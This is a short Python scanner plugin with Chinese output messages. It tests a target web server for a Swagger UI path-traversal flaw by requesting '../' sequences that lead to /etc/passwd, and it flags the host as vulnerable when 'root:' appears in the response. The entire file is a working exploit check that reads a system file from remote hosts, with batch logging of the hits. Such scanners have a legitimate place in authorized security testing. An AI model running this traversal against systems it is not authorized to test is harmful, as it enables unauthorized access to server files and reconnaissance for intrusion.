##! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()

class SwaggerFileReadScan:
    def get_url(self,input_url):
        try:
            url = input_url + "/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "root:" in req.text:
                OutPrintInfoSuc("Swagger", f'目标存在TSwagger任意文件读取漏洞: {url}')
                if self.batch:
                    OutPutFile("swagger_file_read.txt",f'目标存在Swagger任意文件读取漏洞: {url}')
                return True
            else:
                if not self.batch:
                    OutPrintInfo("Swagger", f'目标不存在Swagger任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Swagger",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Swagger", '开始检测Swagger任意文件读取漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("Swagger", 'Swagger任意文件读取漏洞检测结束')

